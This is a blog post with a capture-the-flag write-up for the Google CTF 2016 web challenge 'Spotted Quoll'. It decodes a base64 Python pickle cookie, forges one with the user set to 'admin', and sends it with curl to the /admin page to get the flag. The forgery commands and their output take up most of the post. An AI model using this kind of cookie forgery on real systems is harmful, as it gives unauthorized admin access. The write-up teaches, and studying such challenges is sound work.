---
layout: post
alias: "/blog/2016/05/02/google-ctf-2016-spotted-quoll/"
title: "Google Capture The Flag 2016: Spotted Quoll"
date: 2016-05-02T02:33:29+09:00
tags: [ "ctf", "web", "writeup", "google-ctf" ]
"target_url": [ "https://capturetheflag.withgoogle.com/challenges/" ]
---

You can find the file `/getCookie` in html, so try to GET:

``` sh
$ curl --insecure -D- https://spotted-quoll.ctfcompetition.com/getCookie
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Date: Sun, 01 May 2016 06:38:21 GMT
Server: Google Frontend
Content-Length: 0
Set-Cookie: obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu; Path=/
Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
Expires: Sun, 01 May 2016 06:38:21 GMT
```

A mysterious cookie is given.
The string `obsoletePickle` seems something like python's `pickle`.
This is true, you can decode this as pickle after base64. (this are a word `obsolete`, but you can decode not only Python 2.x, also Python 3.x).

``` python
>>> pickle.loads(base64.b64decode(b'KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu'))
{'python': 'pickles', 'subtle': 'hint', 'user': None}
```

Due to the error message with above cookie is `https://spotted-quoll.ctfcompetition.com/#err=user_not_found`, lets try send a cookie baked with:

```
>>> base64.b64encode(pickle.dumps({'user': 'admin', 'subtle': 'hint', 'python': 'pickles'}, protocol=0))
b'KGRwMApWc3VidGxlCnAxClZoaW50CnAyCnNWcHl0aG9uCnAzClZwaWNrbGVzCnA0CnNWdXNlcgpwNQpWYWRtaW4KcDYKcy4='
```

To avoid such a error `https://spotted-quoll.ctfcompetition.com/#err=unsupported%20pickle%20protocol%3A%203`, you should specify the pickle-protocol as $0$.

``` sh
$ curl --insecure -D- https://spotted-quoll.ctfcompetition.com/admin --cookie obsoletePickle=KGRwMApWc3VidGxlCnAxClZoaW50CnAyCnNWcHl0aG9uCnAzClZwaWNrbGVzCnA0CnNWdXNlcgpwNQpWYWRtaW4KcDYKcy4=
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Vary: Accept-Encoding
Date: Sun, 01 May 2016 06:53:33 GMT
Server: Google Frontend
Alt-Svc: quic=":443"; ma=2592000; v="33,32,31,30,29,28,27,26,25"
Accept-Ranges: none
Transfer-Encoding: chunked

Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?
```
